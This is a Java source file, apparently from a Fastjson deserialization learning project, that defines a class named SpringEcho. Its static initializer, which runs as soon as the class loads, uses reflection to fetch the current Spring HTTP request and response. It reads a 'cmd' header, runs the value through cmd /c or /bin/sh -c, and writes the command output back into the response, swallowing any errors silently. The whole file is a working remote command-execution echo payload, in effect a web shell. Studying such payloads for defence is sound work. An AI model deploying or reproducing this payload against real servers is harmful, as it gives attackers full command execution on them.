package com.endlessshw.fastjsonprinciple.client;

import java.lang.reflect.Method;
import java.util.Scanner;

/**
 * @author EndlessShw
 * @version 1.0
 * @description: TODO
 * @date 2025/6/5 15:23
 */
public class SpringEcho {
    public SpringEcho() {
    }

    static {
        try {
            Class requestContext = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
            Method requestAttributes = requestContext.getMethod("getRequestAttributes");
            Object var2 = requestAttributes.invoke((Object)null);
            requestContext = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
            requestAttributes = requestContext.getMethod("getResponse");
            Method var3 = requestContext.getMethod("getRequest");
            Object var4 = requestAttributes.invoke(var2);
            Object var5 = var3.invoke(var2);
            Method getWriter = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
            Method header = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader", String.class);
            header.setAccessible(true);
            getWriter.setAccessible(true);
            Object writer = getWriter.invoke(var4);
            String var9 = (String)header.invoke(var5, "cmd");
            String[] command = new String[3];
            if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                command[0] = "cmd";
                command[1] = "/c";
            } else {
                command[0] = "/bin/sh";
                command[1] = "-c";
            }

            command[2] = var9;
            writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, (new Scanner(Runtime.getRuntime().exec(command).getInputStream())).useDelimiter("\\A").next());
            writer.getClass().getDeclaredMethod("flush").invoke(writer);
            writer.getClass().getDeclaredMethod("close").invoke(writer);
        } catch (Exception var11) {
        }

    }
}
